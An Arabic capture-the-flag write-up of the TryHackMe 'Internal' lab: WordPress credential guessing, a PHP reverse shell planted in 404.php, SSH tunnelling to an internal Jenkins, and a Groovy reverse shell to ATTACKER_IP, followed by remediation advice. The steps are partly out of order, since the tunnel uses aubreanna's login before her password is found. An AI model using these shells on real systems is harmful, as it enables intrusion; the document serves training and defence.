# Internal — تقرير اختبار الاختراق الشامل

[English Version](README.md) | [📖 قراءة التقرير بالعربية](README_AR.md)
[📄 تحميل التقرير الأصلي بصيغة DOCX](./Internal_THM_Report_EN.docx)

---

## 📋 بطاقة الهدف والمعلومات العامة

| العنصر | التفاصيل |
| :--- | :--- |
| **اسم الماشين** | Internal (منصة TryHackMe) |
| **عنوان الدومين** | `internal.thm` |
| **نظام التشغيل** | Linux (Ubuntu) |
| **مستوى الصعوبة** | صعب (Hard) |
| **أبرز المفاهيم** | استهداف ووردبريس، شبكات دوكر الداخلية (Docker)، الأنفاق الشبكية (SSH Tunneling)، استغلال خادم Jenkins |
| **موطئ القدم الأولي** | تعديل قالب 404.php في ووردبريس للحصول على شل `www-data` |
| **التنقل الجانبي (Pivoting)** | عمل SSH Tunneling للوصول لخادم Jenkins على `172.17.0.2:8080` |
| **تصعيد الصلاحيات (PrivEsc)** | استخراج كلمات سر من `/opt` -> تسجيل دخول كـ `aubreanna` -> الوصول للـ `root` |

---

## 🎯 مسار الهجوم (Attack Chain)

```mermaid
graph LR
    A["فحص Nmap (بورت 80 و 22)"] --> B["إضافة internal.thm لملف hosts"]
    B --> C["تخمين ووردبريس بـ WPScan (admin:my250user)"]
    C --> D["تعديل ملف 404.php والحصول على شل"]
    D --> E["اكتشاف شبكة دوكر داخلية (Jenkins 8080)"]
    E --> F["إنشاء نفق SSH Port Forwarding"]
    F --> G["تنفيذ أكواد Groovy في Jenkins"]
    G --> H["استخراج كلمات السر والدخول كـ aubreanna"]
    H --> I["العثور على باسوورد الـ Root والسيطرة الكاملة"]
```



---

## 🔍 جدول ملخص الثغرات

| الثغرة | مستوى الخطورة | المنفذ / الخدمة | التأثير |
| :--- | :---: | :---: | :---: |
| **كلمات مرور أدمن ضعيفة** | عالي (High) | بورت 80 (WordPress) | السيطرة على لوحة التحكم وتنفيذ أكواد PHP |
| **واجهة أوامر Groovy غير محمية** | حرج (Critical) | بورت 8080 (Jenkins Docker) | تنفيذ أوامر على السيرفر مباشرة (RCE) |
| **حفظ كلمات السر بنص واضح** | عالي (High) | مسار الملفات `/opt` | كشف بيانات المستخدمين وتصعيد الصلاحيات |

---

## 🛠️ خطوات الهجوم العملية

### 1. الاستطلاع وإعداد الاتصال
* فحص المنافذ أظهر المنفذ 80 (Apache) والمنفذ 22 (SSH).
* الموقع يحول تلقائياً على دومين `internal.thm`، لذلك تم ربط الآي بي في ملف `/etc/hosts`:
```bash
echo "<TARGET_IP> internal.thm" | sudo tee -a /etc/hosts
```

### 2. اختراق ووردبريس والحصول على موطئ قدم
باستخدام أداة `wpscan` تم تخمين بيانات حساب الأدمن:
* **اليوزر:** `admin`
* **الباسوورد:** `my250user`
تم الدخول للوحة التحكم وتعديل قالب `404.php` ووضع كود شل عكسي بلغة PHP:
```php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f"); ?>
```
تم استلام الشل كمستخدم `www-data`.

### 3. التوجيه الداخلي واكتشاف خادم Jenkins (Pivoting)
* فحص الشبكة الداخلية كشف عن وجود شبكة `Docker` معزولة برقم `172.17.0.2` يعمل عليها خادم إدارة البرمجيات **Jenkins** على البورت 8080.
* نظراً لأن البورت داخلي، تم عمل **SSH Local Port Forwarding** لتوجيه المنفذ 8080 إلى جهاز المهاجم المحلي:
```bash
ssh -L 8080:172.17.0.2:8080 aubreanna@internal.thm
```
تم فتح المتصفح على `http://localhost:8080` وتسجيل الدخول ببيانات `admin:admin`.

### 4. استغلال Jenkins والوصول للـ Root
* في خادم Jenkins، توجد ميزة تشغيل سكريبتات **Script Console** بلغة Groovy، مما يتيح تنفيذ أوامر كيرنل مباشرة:
```groovy
def cmd = "/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/5555 0>&1'".execute()
cmd.waitFor()
```
* داخل حاوية دوكر، وبفحص المسار `/opt`، تم العثور على ملف ملاحظات `note.txt` يحتوي على كلمة سر المستخدم `aubreanna`.
* بعد تسجيل الدخول بـ SSH، تم العثور على بيانات الـ `root` في ملف نصي آخر، وتمت الترقية إلى مستخدم الجذر `root`.

---

## 🛡️ توصيات الحماية (Remediation)
1. **منع تعديل القوالب:** إضافة سطر `define('DISALLOW_FILE_EDIT', true);` في إعدادات ووردبريس.
2. **عزل خوادم CI/CD:** تأمين لوحة تحكم Jenkins والمصادقة الثنائية وتغيير كلمات السر الافتراضية.
3. **حذف ملفات الاعتماد النصية:** عدم ترك كلمات السر في مسارات المجلدات العامة مثل `/opt` أو `/tmp`.
